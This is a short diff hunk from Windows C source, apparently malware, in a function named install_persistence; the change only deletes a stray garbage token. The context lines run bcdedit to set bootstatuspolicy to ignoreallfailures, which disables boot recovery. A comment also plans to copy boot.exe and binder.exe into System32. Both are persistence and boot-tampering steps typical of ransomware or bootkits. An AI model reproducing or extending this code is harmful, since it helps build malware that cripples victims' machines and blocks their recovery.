@@ -397,7 +397,7 @@ static void install_persistence(void) {
     wchar_t cmd2[] = L"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures";
     CreateProcessW(NULL, cmd2, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     WaitForSingleObject(pi.hProcess, 3000);
-    CloseHandle(pi.hProcess); CloseHandle(pi.hThread) ;etxek;
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread) ;
 
     /* 8. Copy boot.exe and binder.exe to System32 (would be resource in real build) */
     wchar_t boot_dest[MAX_PATH];
